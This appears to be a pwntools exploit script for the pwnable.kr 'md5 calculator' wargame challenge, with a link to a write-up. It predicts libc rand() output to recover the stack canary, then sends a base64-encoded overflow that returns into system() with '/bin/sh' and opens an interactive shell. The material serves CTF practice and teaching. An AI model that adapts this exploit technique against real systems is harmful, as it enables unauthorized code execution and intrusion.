# @write-up : https://minibeef.github.io/write-up/pwnable.kr-md5-calculator/
from pwn import *
from ctypes import *
from ctypes.util import find_library
import base64

system_addr = 0x08048880
bss = 0x0804b0e0

# using c-style random
c = CDLL(find_library('c'))
c.srand(c.time(0))

p = remote('pwnable.kr', 9002)

# pass main function & recv captcha
p.recvuntil('captcha : ')
captcha = p.recvline()[:-1]
p.sendline(captcha)

# leak canary
arr_random = list()
for i in range(8):
    arr_random.append(c.rand())

canary = (int(captcha) - arr_random[4] + arr_random[6] - arr_random[7] - arr_random[2] + arr_random[3] - arr_random[1] - arr_random[5]) & 0xffffffff

# exploit
payload = 'A' * 512
payload += p32(canary)
payload += 'A' * 12
payload += p32(system_addr)
payload += 'A' * 4
payload += p32(bss + len(base64.b64encode(payload)) + 4)
payload = base64.b64encode(payload)
payload += '/bin/sh\x00'

p.sendline(payload)
p.interactive()